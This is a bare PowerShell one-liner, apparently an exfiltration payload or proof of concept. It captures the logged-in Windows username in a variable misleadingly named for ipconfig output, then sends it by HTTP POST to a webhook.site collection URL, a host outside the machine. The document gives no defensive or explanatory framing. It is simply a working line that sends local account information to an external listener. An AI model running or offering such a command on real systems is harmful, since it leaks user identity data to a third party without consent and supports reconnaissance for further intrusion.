$ipconfigOutput = "You are logged in as $env:USERNAME" | Out-String ;; Invoke-WebRequest -Uri https://webhook.site/#!/view/7e6ace7c-1673-44b9-a9be-7976f0cec7fb -Method POST -Body $ipconfigOutput
